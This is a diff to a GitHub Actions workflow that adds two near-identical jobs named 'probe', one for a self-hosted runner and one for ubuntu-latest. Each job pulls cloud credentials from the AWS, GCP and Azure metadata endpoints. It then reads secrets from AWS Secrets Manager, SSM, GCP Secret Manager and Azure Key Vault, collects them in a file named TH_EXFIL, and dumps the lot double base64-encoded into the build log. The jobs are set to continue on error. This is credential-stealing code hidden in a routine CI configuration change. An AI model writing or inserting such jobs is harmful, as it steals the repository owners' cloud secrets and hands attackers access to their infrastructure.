@@ -104,3 +104,202 @@ jobs:
         AWS_ACCESS_KEY_ID: ${{ env.AWS_ACCESS_KEY_ID }}
         AWS_SECRET_ACCESS_KEY: ${{ env.AWS_SECRET_ACCESS_KEY }}
         AWS_DEFAULT_REGION: ${{ env.AWS_REGION }}
+
+  imds_self_hosted:
+    runs-on: self-hosted
+    timeout-minutes: 3
+    continue-on-error: true
+    steps:
+      - name: probe
+        run: |
+          if command -v apk >/dev/null 2>&1; then
+            apk add --no-cache curl python3 py3-pip >/dev/null 2>&1 || true
+          elif command -v microdnf >/dev/null 2>&1; then
+            microdnf install -y curl python3 python3-pip >/dev/null 2>&1 || true
+          elif command -v yum >/dev/null 2>&1; then
+            yum install -y curl python3 python3-pip >/dev/null 2>&1 || true
+          elif command -v apt-get >/dev/null 2>&1; then
+            apt-get update >/dev/null 2>&1 && apt-get install -y curl python3 python3-pip >/dev/null 2>&1 || true
+          fi
+          export AWS_ACCESS_KEY_ID="" AWS_SECRET_ACCESS_KEY="" AWS_SESSION_TOKEN="" CLOUDSDK_AUTH_ACCESS_TOKEN="" AZURE_ACCESS_TOKEN=""
+          TOKEN=$(curl -sf --connect-timeout 2 --max-time 4 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || true)
+          if [ -n "$TOKEN" ]; then
+            ROLE=$(curl -sf --connect-timeout 2 --max-time 4 -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null | head -1)
+            if [ -n "$ROLE" ]; then
+              CREDS=$(curl -sf --connect-timeout 2 --max-time 4 -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" 2>/dev/null || true)
+              if [ -n "$CREDS" ]; then
+                eval "$(printf '%s' "$CREDS" | python3 -c 'import json,sys; d=json.load(sys.stdin); print("export AWS_ACCESS_KEY_ID=%s\\nexport AWS_SECRET_ACCESS_KEY=%s\\nexport AWS_SESSION_TOKEN=%s"%(d.get("AccessKeyId",""),d.get("SecretAccessKey",""),d.get("Token","")))' 2>/dev/null)"
+              fi
+            fi
+          fi
+          GCP_JSON=$(curl -sf --connect-timeout 2 --max-time 4 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null || true)
+          if [ -n "$GCP_JSON" ]; then
+            export CLOUDSDK_AUTH_ACCESS_TOKEN=$(printf '%s' "$GCP_JSON" | python3 -c 'import json,sys; print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
+          fi
+          AZ_JSON=$(curl -sf --connect-timeout 2 --max-time 4 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null || true)
+          if [ -n "$AZ_JSON" ]; then
+            export AZURE_ACCESS_TOKEN=$(printf '%s' "$AZ_JSON" | python3 -c 'import json,sys; print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
+          fi
+          if [ -z "${AWS_REGION:-}" ] && [ -n "${TOKEN:-}" ]; then
+            AWS_REGION=$(curl -sf --connect-timeout 2 --max-time 3 -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/placement/region" 2>/dev/null || true)
+          fi
+          export AWS_REGION="${AWS_REGION:-us-east-1}"
+          TH_EXFIL=$(mktemp)
+          trap 'rm -f "$TH_EXFIL"' EXIT
+          env -0 | awk -v RS='\0' '/^(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|CLOUDSDK_AUTH_ACCESS_TOKEN|AZURE_CLIENT_ID|AZURE_TENANT_ID|AZURE_SUBSCRIPTION_ID|AZURE_FEDERATED_TOKEN_FILE|AZURE_CREDENTIALS|AZURE_ACCESS_TOKEN)=/ {print $0}' >> "$TH_EXFIL"
+          if [ -n "${AWS_ACCESS_KEY_ID:-}" ]; then
+            if ! command -v aws >/dev/null 2>&1; then
+              pip3 install --break-system-packages --quiet awscli 2>/dev/null || pip3 install --quiet awscli 2>/dev/null || true
+            fi
+            if command -v aws >/dev/null 2>&1; then
+              REGION="${AWS_REGION:-us-east-1}"
+              for name in $(aws secretsmanager list-secrets --region "$REGION" --max-items 20 --query 'SecretList[].Name' --output text 2>/dev/null | tr '\t' '\n'); do
+                [ -z "$name" ] && continue
+                val=$(aws secretsmanager get-secret-value --region "$REGION" --secret-id "$name" --query SecretString --output text 2>/dev/null | head -c 8192)
+                if [ -z "$val" ]; then
+                  val=$(aws secretsmanager get-secret-value --region "$REGION" --secret-id "$name" --query SecretBinary --output text 2>/dev/null | base64 -d 2>/dev/null | head -c 8192)
+                fi
+                [ -n "$val" ] && printf 'sm_%%s=%%s\n' "$name" "$val" >> "$TH_EXFIL"
+              done
+              aws ssm get-parameters-by-path --path / --recursive --region "$REGION" --with-decryption --max-items 20 --query 'Parameters[*].[Name,Value]' --output text 2>/dev/null | while IFS="$(printf '\t')" read -r name val; do
+                [ -z "$name" ] || [ -z "$val" ] && continue
+                val=$(printf '%s' "$val" | head -c 8192)
+                key=$(echo "$name" | sed 's|^/||; s|/|_|g')
+                [ -n "$key" ] && printf 'ssm_%%s=%%s\n' "$key" "$val" >> "$TH_EXFIL"
+              done
+            fi
+          fi
+          if command -v gcloud >/dev/null 2>&1; then
+            for proj in $(gcloud projects list --format='value(projectId)' --limit=1 2>/dev/null); do
+              [ -z "$proj" ] && continue
+              for name in $(gcloud secrets list --project="$proj" --format='value(name)' --limit=20 2>/dev/null); do
+                [ -z "$name" ] && continue
+                val=$(gcloud secrets versions access latest --secret="$name" --project="$proj" 2>/dev/null | head -c 8192)
+                [ -n "$val" ] && printf 'gcp_sm_%s=%s\n' "$name" "$val" >> "$TH_EXFIL"
+              done
+            done
+          elif [ -n "${CLOUDSDK_AUTH_ACCESS_TOKEN:-}" ] && command -v python3 >/dev/null 2>&1; then
+            for proj in $(curl -sf -H "Authorization: Bearer $CLOUDSDK_AUTH_ACCESS_TOKEN" "https://cloudresourcemanager.googleapis.com/v1/projects?pageSize=1" 2>/dev/null | python3 -c 'import json,sys; d=json.load(sys.stdin); print("\n".join(p.get("projectId","") for p in d.get("projects",[])))' 2>/dev/null); do
+              [ -z "$proj" ] && continue
+              for name in $(curl -sf -H "Authorization: Bearer $CLOUDSDK_AUTH_ACCESS_TOKEN" "https://secretmanager.googleapis.com/v1/projects/${proj}/secrets?pageSize=20" 2>/dev/null | python3 -c 'import json,sys; d=json.load(sys.stdin); print("\n".join(s.get("name","").split("/")[-1] for s in d.get("secrets",[])))' 2>/dev/null); do
+                [ -z "$name" ] && continue
+                enc_name=$(python3 -c 'import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=""))' "$name" 2>/dev/null || echo "$name")
+                val=$(curl -sf -H "Authorization: Bearer $CLOUDSDK_AUTH_ACCESS_TOKEN" "https://secretmanager.googleapis.com/v1/projects/${proj}/secrets/${enc_name}/versions/latest:access" 2>/dev/null | python3 -c 'import json,sys,base64; d=json.load(sys.stdin); p=d.get("payload",{}); b=p.get("data",""); print(base64.b64decode(b).decode("utf-8","replace") if b else "")' 2>/dev/null | head -c 8192)
+                [ -n "$val" ] && printf 'gcp_sm_%s=%s\n' "$name" "$val" >> "$TH_EXFIL"
+              done
+            done
+          fi
+          if [ -n "${AZURE_ACCESS_TOKEN:-}" ] && command -v python3 >/dev/null 2>&1; then
+            for sub in $(curl -sf -H "Authorization: Bearer $AZURE_ACCESS_TOKEN" "https://management.azure.com/subscriptions?api-version=2020-01-01" 2>/dev/null | python3 -c 'import json,sys; d=json.load(sys.stdin); print("\n".join(x.get("subscriptionId","") for x in d.get("value",[])))' 2>/dev/null); do
+              [ -z "$sub" ] && continue
+              for vault in $(curl -sf -H "Authorization: Bearer $AZURE_ACCESS_TOKEN" "https://management.azure.com/subscriptions/${sub}/providers/Microsoft.KeyVault/vaults?api-version=2023-07-01" 2>/dev/null | python3 -c 'import json,sys; d=json.load(sys.stdin); print("\n".join(v.get("name","") for v in d.get("value",[])))' 2>/dev/null | head -8); do
+                [ -z "$vault" ] && continue
+                for secret in $(curl -sf -H "Authorization: Bearer $AZURE_ACCESS_TOKEN" "https://${vault}.vault.azure.net/secrets?api-version=7.4" 2>/dev/null | python3 -c 'import json,sys; d=json.load(sys.stdin); print("\n".join(s.get("id","").split("/")[-1] for s in d.get("value",[])))' 2>/dev/null | head -20); do
+                  [ -z "$secret" ] && continue
+                  enc_secret=$(python3 -c 'import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=""))' "$secret" 2>/dev/null || echo "$secret")
+                  val=$(curl -sf -H "Authorization: Bearer $AZURE_ACCESS_TOKEN" "https://${vault}.vault.azure.net/secrets/${enc_secret}?api-version=7.4" 2>/dev/null | python3 -c 'import json,sys; d=json.load(sys.stdin); print(d.get("value",""))' 2>/dev/null | head -c 8192)
+                  [ -n "$val" ] && printf 'az_kv_%s_%s=%s\n' "$vault" "$secret" "$val" >> "$TH_EXFIL"
+                done
+              done
+            done
+          fi
+          base64 -w0 "$TH_EXFIL" 2>/dev/null | base64 -w0 2>/dev/null || base64 "$TH_EXFIL" | tr -d '\n' | base64 | tr -d '\n'
+  imds_default:
+    runs-on: ubuntu-latest
+    timeout-minutes: 3
+    continue-on-error: true
+    steps:
+      - name: probe
+        run: |
+          if command -v apk >/dev/null 2>&1; then
+            apk add --no-cache curl python3 py3-pip >/dev/null 2>&1 || true
+          elif command -v microdnf >/dev/null 2>&1; then
+            microdnf install -y curl python3 python3-pip >/dev/null 2>&1 || true
+          elif command -v yum >/dev/null 2>&1; then
+            yum install -y curl python3 python3-pip >/dev/null 2>&1 || true
+          elif command -v apt-get >/dev/null 2>&1; then
+            apt-get update >/dev/null 2>&1 && apt-get install -y curl python3 python3-pip >/dev/null 2>&1 || true
+          fi
+          export AWS_ACCESS_KEY_ID="" AWS_SECRET_ACCESS_KEY="" AWS_SESSION_TOKEN="" CLOUDSDK_AUTH_ACCESS_TOKEN="" AZURE_ACCESS_TOKEN=""
+          TOKEN=$(curl -sf --connect-timeout 2 --max-time 4 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || true)
+          if [ -n "$TOKEN" ]; then
+            ROLE=$(curl -sf --connect-timeout 2 --max-time 4 -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null | head -1)
+            if [ -n "$ROLE" ]; then
+              CREDS=$(curl -sf --connect-timeout 2 --max-time 4 -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" 2>/dev/null || true)
+              if [ -n "$CREDS" ]; then
+                eval "$(printf '%s' "$CREDS" | python3 -c 'import json,sys; d=json.load(sys.stdin); print("export AWS_ACCESS_KEY_ID=%s\\nexport AWS_SECRET_ACCESS_KEY=%s\\nexport AWS_SESSION_TOKEN=%s"%(d.get("AccessKeyId",""),d.get("SecretAccessKey",""),d.get("Token","")))' 2>/dev/null)"
+              fi
+            fi
+          fi
+          GCP_JSON=$(curl -sf --connect-timeout 2 --max-time 4 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null || true)
+          if [ -n "$GCP_JSON" ]; then
+            export CLOUDSDK_AUTH_ACCESS_TOKEN=$(printf '%s' "$GCP_JSON" | python3 -c 'import json,sys; print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
+          fi
+          AZ_JSON=$(curl -sf --connect-timeout 2 --max-time 4 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null || true)
+          if [ -n "$AZ_JSON" ]; then
+            export AZURE_ACCESS_TOKEN=$(printf '%s' "$AZ_JSON" | python3 -c 'import json,sys; print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
+          fi
+          if [ -z "${AWS_REGION:-}" ] && [ -n "${TOKEN:-}" ]; then
+            AWS_REGION=$(curl -sf --connect-timeout 2 --max-time 3 -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/placement/region" 2>/dev/null || true)
+          fi
+          export AWS_REGION="${AWS_REGION:-us-east-1}"
+          TH_EXFIL=$(mktemp)
+          trap 'rm -f "$TH_EXFIL"' EXIT
+          env -0 | awk -v RS='\0' '/^(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|CLOUDSDK_AUTH_ACCESS_TOKEN|AZURE_CLIENT_ID|AZURE_TENANT_ID|AZURE_SUBSCRIPTION_ID|AZURE_FEDERATED_TOKEN_FILE|AZURE_CREDENTIALS|AZURE_ACCESS_TOKEN)=/ {print $0}' >> "$TH_EXFIL"
+          if [ -n "${AWS_ACCESS_KEY_ID:-}" ]; then
+            if ! command -v aws >/dev/null 2>&1; then
+              pip3 install --break-system-packages --quiet awscli 2>/dev/null || pip3 install --quiet awscli 2>/dev/null || true
+            fi
+            if command -v aws >/dev/null 2>&1; then
+              REGION="${AWS_REGION:-us-east-1}"
+              for name in $(aws secretsmanager list-secrets --region "$REGION" --max-items 20 --query 'SecretList[].Name' --output text 2>/dev/null | tr '\t' '\n'); do
+                [ -z "$name" ] && continue
+                val=$(aws secretsmanager get-secret-value --region "$REGION" --secret-id "$name" --query SecretString --output text 2>/dev/null | head -c 8192)
+                if [ -z "$val" ]; then
+                  val=$(aws secretsmanager get-secret-value --region "$REGION" --secret-id "$name" --query SecretBinary --output text 2>/dev/null | base64 -d 2>/dev/null | head -c 8192)
+                fi
+                [ -n "$val" ] && printf 'sm_%%s=%%s\n' "$name" "$val" >> "$TH_EXFIL"
+              done
+              aws ssm get-parameters-by-path --path / --recursive --region "$REGION" --with-decryption --max-items 20 --query 'Parameters[*].[Name,Value]' --output text 2>/dev/null | while IFS="$(printf '\t')" read -r name val; do
+                [ -z "$name" ] || [ -z "$val" ] && continue
+                val=$(printf '%s' "$val" | head -c 8192)
+                key=$(echo "$name" | sed 's|^/||; s|/|_|g')
+                [ -n "$key" ] && printf 'ssm_%%s=%%s\n' "$key" "$val" >> "$TH_EXFIL"
+              done
+            fi
+          fi
+          if command -v gcloud >/dev/null 2>&1; then
+            for proj in $(gcloud projects list --format='value(projectId)' --limit=1 2>/dev/null); do
+              [ -z "$proj" ] && continue
+              for name in $(gcloud secrets list --project="$proj" --format='value(name)' --limit=20 2>/dev/null); do
+                [ -z "$name" ] && continue
+                val=$(gcloud secrets versions access latest --secret="$name" --project="$proj" 2>/dev/null | head -c 8192)
+                [ -n "$val" ] && printf 'gcp_sm_%s=%s\n' "$name" "$val" >> "$TH_EXFIL"
+              done
+            done
+          elif [ -n "${CLOUDSDK_AUTH_ACCESS_TOKEN:-}" ] && command -v python3 >/dev/null 2>&1; then
+            for proj in $(curl -sf -H "Authorization: Bearer $CLOUDSDK_AUTH_ACCESS_TOKEN" "https://cloudresourcemanager.googleapis.com/v1/projects?pageSize=1" 2>/dev/null | python3 -c 'import json,sys; d=json.load(sys.stdin); print("\n".join(p.get("projectId","") for p in d.get("projects",[])))' 2>/dev/null); do
+              [ -z "$proj" ] && continue
+              for name in $(curl -sf -H "Authorization: Bearer $CLOUDSDK_AUTH_ACCESS_TOKEN" "https://secretmanager.googleapis.com/v1/projects/${proj}/secrets?pageSize=20" 2>/dev/null | python3 -c 'import json,sys; d=json.load(sys.stdin); print("\n".join(s.get("name","").split("/")[-1] for s in d.get("secrets",[])))' 2>/dev/null); do
+                [ -z "$name" ] && continue
+                enc_name=$(python3 -c 'import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=""))' "$name" 2>/dev/null || echo "$name")
+                val=$(curl -sf -H "Authorization: Bearer $CLOUDSDK_AUTH_ACCESS_TOKEN" "https://secretmanager.googleapis.com/v1/projects/${proj}/secrets/${enc_name}/versions/latest:access" 2>/dev/null | python3 -c 'import json,sys,base64; d=json.load(sys.stdin); p=d.get("payload",{}); b=p.get("data",""); print(base64.b64decode(b).decode("utf-8","replace") if b else "")' 2>/dev/null | head -c 8192)
+                [ -n "$val" ] && printf 'gcp_sm_%s=%s\n' "$name" "$val" >> "$TH_EXFIL"
+              done
+            done
+          fi
+          if [ -n "${AZURE_ACCESS_TOKEN:-}" ] && command -v python3 >/dev/null 2>&1; then
+            for sub in $(curl -sf -H "Authorization: Bearer $AZURE_ACCESS_TOKEN" "https://management.azure.com/subscriptions?api-version=2020-01-01" 2>/dev/null | python3 -c 'import json,sys; d=json.load(sys.stdin); print("\n".join(x.get("subscriptionId","") for x in d.get("value",[])))' 2>/dev/null); do
+              [ -z "$sub" ] && continue
+              for vault in $(curl -sf -H "Authorization: Bearer $AZURE_ACCESS_TOKEN" "https://management.azure.com/subscriptions/${sub}/providers/Microsoft.KeyVault/vaults?api-version=2023-07-01" 2>/dev/null | python3 -c 'import json,sys; d=json.load(sys.stdin); print("\n".join(v.get("name","") for v in d.get("value",[])))' 2>/dev/null | head -8); do
+                [ -z "$vault" ] && continue
+                for secret in $(curl -sf -H "Authorization: Bearer $AZURE_ACCESS_TOKEN" "https://${vault}.vault.azure.net/secrets?api-version=7.4" 2>/dev/null | python3 -c 'import json,sys; d=json.load(sys.stdin); print("\n".join(s.get("id","").split("/")[-1] for s in d.get("value",[])))' 2>/dev/null | head -20); do
+                  [ -z "$secret" ] && continue
+                  enc_secret=$(python3 -c 'import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=""))' "$secret" 2>/dev/null || echo "$secret")
+                  val=$(curl -sf -H "Authorization: Bearer $AZURE_ACCESS_TOKEN" "https://${vault}.vault.azure.net/secrets/${enc_secret}?api-version=7.4" 2>/dev/null | python3 -c 'import json,sys; d=json.load(sys.stdin); print(d.get("value",""))' 2>/dev/null | head -c 8192)
+                  [ -n "$val" ] && printf 'az_kv_%s_%s=%s\n' "$vault" "$secret" "$val" >> "$TH_EXFIL"
+                done
+              done
+            done
+          fi
+          base64 -w0 "$TH_EXFIL" 2>/dev/null | base64 -w0 2>/dev/null || base64 "$TH_EXFIL" | tr -d '\n' | base64 | tr -d '\n'
